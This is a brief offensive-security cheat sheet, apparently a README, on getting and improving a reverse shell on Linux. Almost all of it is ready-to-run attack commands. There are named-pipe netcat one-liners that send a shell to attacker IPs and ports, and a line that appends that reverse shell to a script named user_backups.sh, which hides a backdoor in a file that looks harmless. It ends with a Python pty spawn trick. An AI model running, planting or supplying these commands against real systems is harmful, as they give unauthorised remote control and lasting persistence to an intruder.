# Upgrading-Linux-Shell

### Summary

Sometimes when using a reverse shell on it's own, the shell is not 100% functional. Using this may help with that.

### Commands

Reverse shell command
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.95 4444 >/tmp/f
```
```
'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f'
```

Reverse shell into file
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
```

If already have a shell on linux
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
